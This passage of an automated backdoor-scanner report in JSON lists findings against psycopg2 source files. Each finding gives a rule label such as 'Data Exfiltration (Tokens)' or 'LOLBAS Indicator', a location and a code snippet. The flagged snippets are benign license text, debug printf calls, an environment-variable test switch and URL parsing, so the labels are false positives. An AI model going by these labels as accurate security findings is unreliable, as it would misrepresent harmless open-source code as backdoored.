                      "markdown": "`tmp=${tmp/vnc:\\/\\//}  # m1:PASS@1.2.3.4:5900\nuser=${tmp%%:*}  # m1\ntmp=${tmp#*:}  # PASS@1.2.3.4:5900\npassword=${tmp%%@*}  # PASS\ntmp=${tmp#*@}  # 1.2.3.4:5900\nhost=${tmp%%:*}  # 1.2.3.4\n\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/run_build_macos_arm64.sh"
                },
                "region": {
                  "startLine": 39,
                  "startColumn": 12,
                  "endLine": 39,
                  "endColumn": 20,
                  "snippet": {
                    "text": "    error \"server status is $status\"\nfi\n\n# Get user, password, ip from vnc url\ntmp=$(echo \"$server\" | jq -r .vnc_url)  # vnc://m1:PASS@1.2.3.4:5900\ntmp=${tmp/vnc:\\/\\//}  # m1:PASS@1.2.3.4:5900\nuser=${tmp%%:*}  # m1\n",
                    "rendered": {
                      "text": "    error \"server status is $status\"\nfi\n\n# Get user, password, ip from vnc url\ntmp=$(echo \"$server\" | jq -r .vnc_url)  # vnc://m1:PASS@1.2.3.4:5900\ntmp=${tmp/vnc:\\/\\//}  # m1:PASS@1.2.3.4:5900\nuser=${tmp%%:*}  # m1\n",
                      "markdown": "`    error \"server status is $status\"\nfi\n\n# Get user, password, ip from vnc url\ntmp=$(echo \"$server\" | jq -r .vnc_url)  # vnc://m1:PASS@1.2.3.4:5900\ntmp=${tmp/vnc:\\/\\//}  # m1:PASS@1.2.3.4:5900\nuser=${tmp%%:*}  # m1\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/scripts/build/run_build_macos_arm64.sh"
                },
                "region": {
                  "startLine": 9,
                  "startColumn": 55,
                  "endLine": 9,
                  "endColumn": 65,
                  "snippet": {
                    "text": "# remotely and execute the `build_macos_arm64.sh` script remotely, then will\n# download the built packages. A tag to build must be specified.\n\n# The script requires a Scaleway secret key in the SCW_SECRET_KEY env var:\n# It will use scaleway_m1.sh to provision a server and use it.\n\nset -euo pipefail\n",
                    "rendered": {
                      "text": "# remotely and execute the `build_macos_arm64.sh` script remotely, then will\n# download the built packages. A tag to build must be specified.\n\n# The script requires a Scaleway secret key in the SCW_SECRET_KEY env var:\n# It will use scaleway_m1.sh to provision a server and use it.\n\nset -euo pipefail\n",
                      "markdown": "`# remotely and execute the `build_macos_arm64.sh` script remotely, then will\n# download the built packages. A tag to build must be specified.\n\n# The script requires a Scaleway secret key in the SCW_SECRET_KEY env var:\n# It will use scaleway_m1.sh to provision a server and use it.\n\nset -euo pipefail\n`"
                    }
                  },
                  "sourceLanguage": "shellscript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_psycopg2_dbapi20.py"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 22,
                  "endLine": 15,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                    "rendered": {
                      "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                      "markdown": "`#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_psycopg2_dbapi20.py"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 42,
                  "endLine": 14,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                    "rendered": {
                      "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                      "markdown": "`# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_errcodes.py"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 22,
                  "endLine": 15,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                    "rendered": {
                      "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                      "markdown": "`#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_errcodes.py"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 42,
                  "endLine": 14,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                    "rendered": {
                      "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                      "markdown": "`# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_with.py"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 22,
                  "endLine": 15,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                    "rendered": {
                      "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                      "markdown": "`#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_with.py"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 42,
                  "endLine": 14,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                    "rendered": {
                      "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                      "markdown": "`# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/testutils.py"
                },
                "region": {
                  "startLine": 523,
                  "startColumn": 35,
                  "endLine": 523,
                  "endColumn": 41,
                  "snippet": {
                    "text": "\n    Note: in order to find slow tests you can run:\n\n    make check 2>&1 | ts -i \"%.s\" | sort -n\n    \"\"\"\n    @wraps(f)\n    def slow_(self):\n",
                    "rendered": {
                      "text": "\n    Note: in order to find slow tests you can run:\n\n    make check 2>&1 | ts -i \"%.s\" | sort -n\n    \"\"\"\n    @wraps(f)\n    def slow_(self):\n",
                      "markdown": "`\n    Note: in order to find slow tests you can run:\n\n    make check 2>&1 | ts -i \"%.s\" | sort -n\n    \"\"\"\n    @wraps(f)\n    def slow_(self):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/testutils.py"
                },
                "region": {
                  "startLine": 521,
                  "startColumn": 21,
                  "endLine": 521,
                  "endColumn": 27,
                  "snippet": {
                    "text": "def slow(f):\n    \"\"\"Decorator to mark slow tests we may want to skip\n\n    Note: in order to find slow tests you can run:\n\n    make check 2>&1 | ts -i \"%.s\" | sort -n\n    \"\"\"\n",
                    "rendered": {
                      "text": "def slow(f):\n    \"\"\"Decorator to mark slow tests we may want to skip\n\n    Note: in order to find slow tests you can run:\n\n    make check 2>&1 | ts -i \"%.s\" | sort -n\n    \"\"\"\n",
                      "markdown": "`def slow(f):\n    \"\"\"Decorator to mark slow tests we may want to skip\n\n    Note: in order to find slow tests you can run:\n\n    make check 2>&1 | ts -i \"%.s\" | sort -n\n    \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/testutils.py"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 22,
                  "endLine": 14,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                    "rendered": {
                      "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                      "markdown": "`#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/testutils.py"
                },
                "region": {
                  "startLine": 13,
                  "startColumn": 42,
                  "endLine": 13,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                    "rendered": {
                      "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                      "markdown": "`# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/testutils.py"
                },
                "region": {
                  "startLine": 527,
                  "startColumn": 21,
                  "endLine": 527,
                  "endColumn": 26,
                  "snippet": {
                    "text": "    \"\"\"\n    @wraps(f)\n    def slow_(self):\n        if os.environ.get('PSYCOPG2_TEST_FAST', '0') != '0':\n            return self.skipTest(\"slow test\")\n        return f(self)\n    return slow_\n",
                    "rendered": {
                      "text": "    \"\"\"\n    @wraps(f)\n    def slow_(self):\n        if os.environ.get('PSYCOPG2_TEST_FAST', '0') != '0':\n            return self.skipTest(\"slow test\")\n        return f(self)\n    return slow_\n",
                      "markdown": "`    \"\"\"\n    @wraps(f)\n    def slow_(self):\n        if os.environ.get('PSYCOPG2_TEST_FAST', '0') != '0':\n            return self.skipTest(\"slow test\")\n        return f(self)\n    return slow_\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/testutils.py"
                },
                "region": {
                  "startLine": 486,
                  "startColumn": 5,
                  "endLine": 486,
                  "endColumn": 13,
                  "snippet": {
                    "text": "    \"named cursor\": 41412,\n    \"nested array\": 32552,\n    \"notify\": 41522,\n    \"password_encryption\": 42519,\n    \"range\": 41282,\n    \"scroll cursor\": 77102,\n    \"stored procedure\": 1751,\n",
                    "rendered": {
                      "text": "    \"named cursor\": 41412,\n    \"nested array\": 32552,\n    \"notify\": 41522,\n    \"password_encryption\": 42519,\n    \"range\": 41282,\n    \"scroll cursor\": 77102,\n    \"stored procedure\": 1751,\n",
                      "markdown": "`    \"named cursor\": 41412,\n    \"nested array\": 32552,\n    \"notify\": 41522,\n    \"password_encryption\": 42519,\n    \"range\": 41282,\n    \"scroll cursor\": 77102,\n    \"stored procedure\": 1751,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/testutils.py"
                },
                "region": {
                  "startLine": 527,
                  "startColumn": 14,
                  "endLine": 527,
                  "endColumn": 25,
                  "snippet": {
                    "text": "    \"\"\"\n    @wraps(f)\n    def slow_(self):\n        if os.environ.get('PSYCOPG2_TEST_FAST', '0') != '0':\n            return self.skipTest(\"slow test\")\n        return f(self)\n    return slow_\n",
                    "rendered": {
                      "text": "    \"\"\"\n    @wraps(f)\n    def slow_(self):\n        if os.environ.get('PSYCOPG2_TEST_FAST', '0') != '0':\n            return self.skipTest(\"slow test\")\n        return f(self)\n    return slow_\n",
                      "markdown": "`    \"\"\"\n    @wraps(f)\n    def slow_(self):\n        if os.environ.get('PSYCOPG2_TEST_FAST', '0') != '0':\n            return self.skipTest(\"slow test\")\n        return f(self)\n    return slow_\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_cursor.py"
                },
                "region": {
                  "startLine": 353,
                  "startColumn": 61,
                  "endLine": 353,
                  "endColumn": 67,
                  "snippet": {
                    "text": "        self._test_external_close(control_conn, connect_func, wait_func)\n\n    def _test_external_close(self, control_conn, connect_func, wait_func):\n        # The short sleep before using victim_conn the second time makes it\n        # much more likely to lose the race and see the bug. Repeating the\n        # test several times makes it even more likely.\n        for i in range(10):\n",
                    "rendered": {
                      "text": "        self._test_external_close(control_conn, connect_func, wait_func)\n\n    def _test_external_close(self, control_conn, connect_func, wait_func):\n        # The short sleep before using victim_conn the second time makes it\n        # much more likely to lose the race and see the bug. Repeating the\n        # test several times makes it even more likely.\n        for i in range(10):\n",
                      "markdown": "`        self._test_external_close(control_conn, connect_func, wait_func)\n\n    def _test_external_close(self, control_conn, connect_func, wait_func):\n        # The short sleep before using victim_conn the second time makes it\n        # much more likely to lose the race and see the bug. Repeating the\n        # test several times makes it even more likely.\n        for i in range(10):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_cursor.py"
                },
                "region": {
                  "startLine": 28,
                  "startColumn": 6,
                  "endLine": 29,
                  "snippet": {
                    "text": "\nimport gc\nimport sys\nimport time\nimport ctypes\nimport pickle\nimport psycopg2\nimport psycopg2.extensions\n",
                    "rendered": {
                      "text": "\nimport gc\nimport sys\nimport time\nimport ctypes\nimport pickle\nimport psycopg2\nimport psycopg2.extensions\n",
                      "markdown": "`\nimport gc\nimport sys\nimport time\nimport ctypes\nimport pickle\nimport psycopg2\nimport psycopg2.extensions\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_cursor.py"
                },
                "region": {
                  "startLine": 15,
                  "startColumn": 22,
                  "endLine": 15,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                    "rendered": {
                      "text": "#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n",
                      "markdown": "`#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n# You must obey the GNU Lesser General Public License in all respects for\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/tests/test_cursor.py"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 42,
                  "endLine": 14,
                  "endColumn": 51,
                  "snippet": {
                    "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                    "rendered": {
                      "text": "# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n",
                      "markdown": "`# (at your option) any later version.\n#\n# In addition, as a special exception, the copyright holders give\n# permission to link this program with the OpenSSL library (or with\n# modified versions of OpenSSL that use the same license as OpenSSL),\n# and distribute linked combinations including the two.\n#\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/adapter_qstring.c"
                },
                "region": {
                  "startLine": 238,
                  "startColumn": 52,
                  "endLine": 238,
                  "endColumn": 56,
                  "snippet": {
                    "text": "    Py_CLEAR(self->conn);\n    PyMem_Free((void *)self->encoding);\n\n    Dprintf(\"qstring_dealloc: deleted qstring object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        obj, Py_REFCNT(obj)\n      );\n",
                    "rendered": {
                      "text": "    Py_CLEAR(self->conn);\n    PyMem_Free((void *)self->encoding);\n\n    Dprintf(\"qstring_dealloc: deleted qstring object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        obj, Py_REFCNT(obj)\n      );\n",
                      "markdown": "`    Py_CLEAR(self->conn);\n    PyMem_Free((void *)self->encoding);\n\n    Dprintf(\"qstring_dealloc: deleted qstring object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        obj, Py_REFCNT(obj)\n      );\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/adapter_qstring.c"
                },
                "region": {
                  "startLine": 221,
                  "startColumn": 47,
                  "endLine": 221,
                  "endColumn": 51,
                  "snippet": {
                    "text": "    Py_INCREF(str);\n    self->wrapped = str;\n\n    Dprintf(\"qstring_setup: good qstring object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n",
                    "rendered": {
                      "text": "    Py_INCREF(str);\n    self->wrapped = str;\n\n    Dprintf(\"qstring_setup: good qstring object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n",
                      "markdown": "`    Py_INCREF(str);\n    self->wrapped = str;\n\n    Dprintf(\"qstring_setup: good qstring object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/adapter_qstring.c"
                },
                "region": {
                  "startLine": 213,
                  "startColumn": 47,
                  "endLine": 213,
                  "endColumn": 51,
                  "snippet": {
                    "text": "static int\nqstring_setup(qstringObject *self, PyObject *str)\n{\n    Dprintf(\"qstring_setup: init qstring object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n",
                    "rendered": {
                      "text": "static int\nqstring_setup(qstringObject *self, PyObject *str)\n{\n    Dprintf(\"qstring_setup: init qstring object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n",
                      "markdown": "`static int\nqstring_setup(qstringObject *self, PyObject *str)\n{\n    Dprintf(\"qstring_setup: init qstring object at %p, refcnt = \"\n        FORMAT_CODE_PY_SSIZE_T,\n        self, Py_REFCNT(self)\n      );\n`"
                    }
                  },
                  "sourceLanguage": "c"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/psycopg2.zip/psycopg/pqpath.c"
                },
                "region": {
                  "startLine": 1022,
                  "startColumn": 41,
                  "endLine": 1022,
                  "endColumn": 45,
                  "snippet": {
                    "text": "        cast = psyco_default_cast;\n    }\n\n    Dprintf(\"_pq_fetch_tuples: using cast at %p for type %u\", cast, ftype);\n\n    /* success */\n    Py_INCREF(cast);\n",
                    "rendered": {
                      "text": "        cast = psyco_default_cast;\n    }\n\n    Dprintf(\"_pq_fetch_tuples: using cast at %p for type %u\", cast, ftype);\n\n    /* success */\n    Py_INCREF(cast);\n",
